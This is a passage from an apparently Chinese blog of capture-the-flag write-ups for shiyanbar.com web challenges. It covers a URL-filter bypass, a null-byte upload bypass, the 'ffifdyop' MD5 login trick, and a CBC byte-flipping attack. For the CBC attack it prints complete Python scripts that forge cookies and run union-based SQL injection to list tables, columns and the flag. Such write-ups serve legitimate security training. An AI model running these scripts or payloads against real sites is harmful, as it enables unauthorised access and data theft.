class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">&#x2F;&#x2F; code by SEC@USTC</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;charset&quot; content&#x3D;&quot;gbk&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$URL &#x3D; $_SERVER[&#39;REQUEST_URI&#39;];</span><br><span class="line">&#x2F;&#x2F;echo &#39;URL: &#39;.$URL.&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">$flag &#x3D; &quot;CTF&#123;???&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$code &#x3D; str_replace($flag, &#39;CTF&#123;???&#125;&#39;, file_get_contents(&#39;.&#x2F;index.php&#39;));\\从index.php中读入一个字符串，再讲文件字符串中的flag变量值改变为CTF&#123;???&#125;</span><br><span class="line">$stop &#x3D; 0;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这道题目本身也有教学的目的</span><br><span class="line">&#x2F;&#x2F;第一，我们可以构造 &#x2F;indirection&#x2F;a&#x2F;..&#x2F; &#x2F;indirection&#x2F;.&#x2F; 等等这一类的</span><br><span class="line">&#x2F;&#x2F;所以，第一个要求就是不得出现 .&#x2F;</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &#39;.&#x2F;&#39;) !&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 1;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第二，我们可以构造 \ 来代替被过滤的 &#x2F;</span><br><span class="line">&#x2F;&#x2F;所以，第二个要求就是不得出现 ..&#x2F;</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &#39;\\&#39;) !&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 2;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第三，有的系统大小写通用，例如 indirectioN&#x2F;</span><br><span class="line">&#x2F;&#x2F;你也可以用?和#等等的字符绕过，这需要统一解决</span><br><span class="line">&#x2F;&#x2F;所以，第三个要求对可以用的字符做了限制，a-z &#x2F; 和 .</span><br><span class="line">$matches &#x3D; array();</span><br><span class="line">preg_match(&#39;&#x2F;^([0-9a-z\&#x2F;.]+)$&#x2F;&#39;, $URL, $matches);</span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] !&#x3D; $URL)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 3;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第四，多个 &#x2F; 也是可以的</span><br><span class="line">&#x2F;&#x2F;所以，第四个要求是不得出现 &#x2F;&#x2F;</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &#39;&#x2F;&#x2F;&#39;) !&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 4;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第五，显然加上index.php或者减去index.php都是可以的</span><br><span class="line">&#x2F;&#x2F;所以我们下一个要求就是必须包含&#x2F;index.php，并且以此结尾</span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !&#x3D;&#x3D; &#39;&#x2F;index.php&#39;)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 5;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第六，我们知道在index.php后面加.也是可以的</span><br><span class="line">&#x2F;&#x2F;所以我们禁止p后面出现.这个符号</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &#39;p.&#39;) !&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 6;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第七，现在是最关键的时刻</span><br><span class="line">&#x2F;&#x2F;你的$URL必须与&#x2F;indirection&#x2F;index.php有所不同</span><br><span class="line">if($flag &amp;&amp; $URL &#x3D;&#x3D; &#39;&#x2F;indirection&#x2F;index.php&#39;)&#123;</span><br><span class="line">    $flag &#x3D; &quot;&quot;;</span><br><span class="line">    $stop &#x3D; 7;        &#x2F;&#x2F;Pass</span><br><span class="line">&#125;</span><br><span class="line">if(!$stop) $stop &#x3D; 8;</span><br><span class="line"></span><br><span class="line">echo &#39;Flag: &#39;.$flag;</span><br><span class="line">echo &#39;&lt;hr &#x2F;&gt;&#39;;</span><br><span class="line">for($i &#x3D; 1; $i &lt; $stop; $i++)</span><br><span class="line">    $code &#x3D; str_replace(&#39;&#x2F;&#x2F;Pass &#39;.$i, &#39;&#x2F;&#x2F;Pass&#39;, $code);</span><br><span class="line">for(; $i &lt; 8; $i++)</span><br><span class="line">    $code &#x3D; str_replace(&#39;&#x2F;&#x2F;Pass &#39;.$i, &#39;&#x2F;&#x2F;Not Pass&#39;, $code);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE);</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39;; </span><br></pre></td></tr></table></figure><p>代码中要求要去访问index.php，但是不能直接使用/indirection/index.php访问，同时过滤了./<br>、../、大小写绕过、//、文件后的. 、以及必须以/index.php结尾<br>在网上搜索了一下才知道可以利用伪静态技术，构造url：<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>相当于服务器将第二个index.php当做参数处理了，服务器就只解析到第一个index.php<br>flag： CTF{PSEDUO_STATIC_DO_YOU_KNOW}   </p><h4 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h4><p>开始随便输入，然后bp抓包，发现tips：test.php<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fry0lfei0ij30yo09rq4n.jpg" alt="image"><br>访问<a href="http://ctf5.shiyanbar.com/web/jiandan/test.php">http://ctf5.shiyanbar.com/web/jiandan/test.php</a><br>得到源码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &#39;***********&#39;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);\\想到cbc字节翻转攻击</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;conn.php&#39;);</span><br><span class="line">function sqliCheck($str)&#123;\\该函数对传入的变量进行过滤，防止SQL注入</span><br><span class="line">if(preg_match(&quot;&#x2F;\\\|,|-|#|&#x3D;|~|union|like|procedure&#x2F;i&quot;,$str))&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">function get_random_iv()&#123;\\该函数随机生产一个16位iv值</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">$iv &#x3D; get_random_iv();</span><br><span class="line">$plain &#x3D; serialize($info);\\对传入的数组序列化</span><br><span class="line">    $cipher &#x3D; openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);&#x2F;&#x2F; 采用aes-128-cbc 方式加密序列化后的plain,返回原始或者base64编码后的字符串</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));&#x2F;&#x2F;cookie 值为base64编码的iv</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));&#x2F;&#x2F; cookie 值为bas64编码的值cipher</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">global $link;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);&#x2F;&#x2F; 解码cookie和iv，并解密得到plain</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);\\这里的plain可能有两个值</span><br><span class="line">            $sql&#x3D;&quot;select * from users limit &quot;.$info[&#39;id&#39;].&quot;,0&quot;;</span><br><span class="line">            $result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">            $rows&#x3D;mysqli_fetch_array($result);</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&#39;.$rows[&#39;username&#39;].&#39;&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; (string)$_POST[&#39;id&#39;];</span><br><span class="line">    if(sqliCheck($id))\\过滤非法参数  </span><br><span class="line">die(&quot;&lt;h1 style&#x3D;&#39;color:red&#39;&gt;&lt;center&gt;sql inject detected!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    $info &#x3D; array(&#39;id&#39;&#x3D;&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&#39;cipher&#39;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;body class&#x3D;&quot;login-body&quot; style&#x3D;&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id&#x3D;&quot;wrapper&quot; style&#x3D;&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name&#x3D;&quot;login-form&quot; class&#x3D;&quot;login-form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;&#x2F;h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;&#x2F;span&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;id&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input id&quot; value&#x3D;&quot;id&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot; class&#x3D;&quot;button&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;body&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>遇到的问题</strong>  </p><ul><li>需要进行SQL注入但是遇到了关键字过滤  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x2F;\\\|,|-|#|&#x3D;|~|union|like|procedure&#x2F;i&quot;</span><br></pre></td></tr></table></figure></li><li>SQL查询是id参数后面如何将后面的,0注释掉  </li><li>见到aes-128-cbc自然想到cbc字节翻转攻击，那么怎么来利用<br><a href="https://www.jianshu.com/p/4c1e5d24d781">参考文章</a>   </li></ul><p><strong>解决方法</strong></p><ul><li>利用%00截断后面的,0 </li><li>使用cbc翻转将lnion变为union绕过过滤(CBC翻转 关键在，初始化因子 xor 原文 xor 你想的字符串 得到 更改版的初始化因子)     </li></ul><h5 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a><strong>CBC字节翻转攻击</strong></h5><p><a href="http://www.freebuf.com/articles/system/163756.html">参考文章</a><br>加密过程：<br><img src="http://image.3001.net/images/20180228/15198072135832.png!small" alt="image"><br>Plaintext：明文数据</p><p>IV：初始向量</p><p>Key：分组加密使用的密钥</p><p>Ciphertext：密文数据<br>解密过程：<br>每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。</p><p>对于第一组则是与IV进行异或。    </p><p>涉及名词：偏移量、php序列化、aes加密、异或</p><p><strong>攻击过程：</strong><br><strong>对于解密时</strong>：</p><p>设明文为X，密文为Y，解密函数为k。</p><p>X[i] = k(Y[i]) Xor Y[i-1]<br><strong>解密第一组时</strong>：</p><p>X[1]=k(Y[1]) Xor IV</p><p>对于X[i]的解密时，X[i] = k(Y[i]) Xor Y[i-1]，k(Y[i])部分是无法控制的，假如修改Y[i]的值，是无法确定k(Y[i])的值，由于最后是异或操作，因此可以仅修改Y[i-1]的内容为Y’[i-1]来控制最后的明文的值，设解密后的内容为M[i]=k(Y[i]) Xor Y[i-1]。</p><p>将Y[i-1]的值设置为Y[i-1] Xor M[i]的值，新的Y[i-1]的值用Y’[i-1]表示。</p><p>那么X[i] = k(Y[i]) Xor Y’[i-1]=k(Y[i]) Xor Y[i-1] Xor M[i] = M[i] Xor M[i] = 0</p><p>这样就能将只修改Y[i-1]的内容来控制X[i]的值</p><p>而此时X[i-1]的值肯定就会出错了，设修改Y[i-1]的值，导致解密后X[i-1]的值为M[i-1]，那么将Y[i-2]的值改为Y[i-2]=Y[i-2] Xor M[i-1] Xor 任意值，可以使得X[i-1]=任意值</p><p>这样循环往前，最后一组就是根据M[1]的值修改IV=IV Xor M[1] Xor 任意值，使得X[1]=任意值</p><p>对于本题来说，cookie中储存了初始的iv和cipher,我们可以利用bp修改，在本题中也是一样，先获取cipher 对应的cookie，然后字节反转为我们想要的payload，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__&#x3D;&#39;pcat@chamd5.org&#39;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">cipher&#x3D;&#39;sZMYZaZsCxj98IedEp83YeaXgk4TtWPbw6D5mhkzP1I%3D&#39;</span><br><span class="line">cipher_raw&#x3D;b64decode(urllib.unquote(cipher))</span><br><span class="line">lst&#x3D;list(cipher_raw)</span><br><span class="line">idx&#x3D;4</span><br><span class="line">c1&#x3D;&#39;2&#39;</span><br><span class="line">c2&#x3D;&#39;#&#39;</span><br><span class="line">lst[idx]&#x3D;chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">cipher_new&#x3D;&#39;&#39;.join(lst)</span><br><span class="line">cipher_new&#x3D;urllib.quote(b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br></pre></td></tr></table></figure><p>这里得到了新的cipher，下面利用返回的密文值和公式 C = A XOR B得到新的iv，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__&#x3D;&#39;pcat@chamd5.org&#39;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">iv&#x3D;&#39;Ko5zoC%2BklAcyqq%2BqihjbwA%3D%3D&#39;</span><br><span class="line">iv_raw&#x3D;b64decode(urllib.unquote(iv))</span><br><span class="line">first&#x3D;&#39;a:1:&#123;s:2:&quot;id&quot;;s:&#39;</span><br><span class="line">plain&#x3D;b64decode(&#39;g8COFrN&#x2F;0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)</span><br><span class="line">iv_new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+&#x3D;chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new&#x3D;urllib.quote(b64encode(iv_new))</span><br><span class="line">print iv_new</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述的两个脚本就可以修改iv, cipher, 将id=12 的情况变成id=1#，最后的查询脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line"># 请保留我的个人信息，谢谢~！</span><br><span class="line">__author__&#x3D;&#39;pcat@chamd5.org&#39;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"># 解码base64，获得iv,cipher的加密值</span><br><span class="line">def mydecode(value):</span><br><span class="line">return b64decode(urllib.unquote(value))</span><br><span class="line"># 转码</span><br><span class="line">def myencode(value):</span><br><span class="line">return urllib.quote(b64encode(value))</span><br><span class="line"># 字节反转：将指定偏移量的字符转换为新的字符</span><br><span class="line">def mycbc(value,idx,c1,c2):</span><br><span class="line">lst&#x3D;list(value)</span><br><span class="line">lst[idx]&#x3D;chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">return &#39;&#39;.join(lst)</span><br><span class="line"># 提交payload，获取cookie，并将cookie 解密为iv，cipher，再使用字节反转攻击，使得sql 查询能够成功</span><br><span class="line">def pcat(payload,idx,c1,c2):</span><br><span class="line">url&#x3D;r&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;jiandan&#x2F;index.php&#39;</span><br><span class="line">myd&#x3D;&#123;&#39;id&#39;:payload&#125;</span><br><span class="line">res&#x3D;requests.post(url,data&#x3D;myd)</span><br><span class="line">cookies&#x3D;res.headers[&#39;Set-Cookie&#39;]</span><br><span class="line">iv&#x3D;re.findall(r&#39;iv&#x3D;(.*?),&#39;,cookies)[0]</span><br><span class="line">cipher&#x3D;re.findall(r&#39;cipher&#x3D;(.*)&#39;,cookies)[0]</span><br><span class="line">iv_raw&#x3D;mydecode(iv)</span><br><span class="line">cipher_raw&#x3D;mydecode(cipher)  </span><br><span class="line"># 字节反转，先转换cipher，得到aes加密的密文(非base64加密后得值)，再利用异或，求出随机生成得iv</span><br><span class="line">cipher_new&#x3D;myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">cookies_new&#x3D;&#123;&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new&#125;</span><br><span class="line">cont&#x3D;requests.get(url,cookies&#x3D;cookies_new).content</span><br><span class="line">plain&#x3D;b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])</span><br><span class="line">first&#x3D;&#39;a:1:&#123;s:2:&quot;id&quot;;s:&#39;</span><br><span class="line">iv_new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+&#x3D;chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new&#x3D;myencode(iv_new)</span><br><span class="line"># 得到源码生产的随机值iv 和aes 加密得cipher，并且plain 明文在cbc字节反转下可控</span><br><span class="line">cookies_new&#x3D;&#123;&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new&#125;</span><br><span class="line">cont&#x3D;requests.get(url,cookies&#x3D;cookies_new).content</span><br><span class="line">print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)</span><br><span class="line">print cont</span><br><span class="line">pass</span><br><span class="line"># 不断带入构造好的sql 语句，得到返回结果即可</span><br><span class="line">def foo():</span><br><span class="line">pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)</span><br><span class="line">pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select</span><br><span class="line">3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)</span><br><span class="line">pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema regexp database())b join (select</span><br><span class="line">3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from</span><br><span class="line">information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select</span><br><span class="line">3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join</span><br><span class="line">(select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)</span><br><span class="line">pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">foo()</span><br><span class="line">print &#39;ok&#39;</span><br></pre></td></tr></table></figure><h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p>查看源码发现  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password&#x3D;$_POST[&#39;password&#39;];</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br><span class="line">$result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">echo &#39;flag is :&#39;.$flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;密码错误!&#39;;</span><br><span class="line">&#125; --&gt;</span><br></pre></td></tr></table></figure><p>密码是经过md5哈希加密的，不懂网上查了一下，脑洞题，密码<img src="https://img-blog.csdn.net/20180324215047728" alt="image">中的ffifdyop   </p><h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>随便上传一个png图片<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry43htcz8j30eu05ct9c.jpg" alt="image"><br>那上传一个PHP喃<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry45loq5uj30k502idfv.jpg" alt="image"><br>在上传绕过里最有名的的就是00截断，那么我们就先要抓包<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4a9zjkjj30zc0bxwfk.jpg" alt="image">   </p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4fmdsgwj30zv0bljt5.jpg" alt="image"></p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4gn71u3j3121096jsx.jpg" alt="image">   </p><h4 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h4><p>提示：科学计数法<br>源码： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 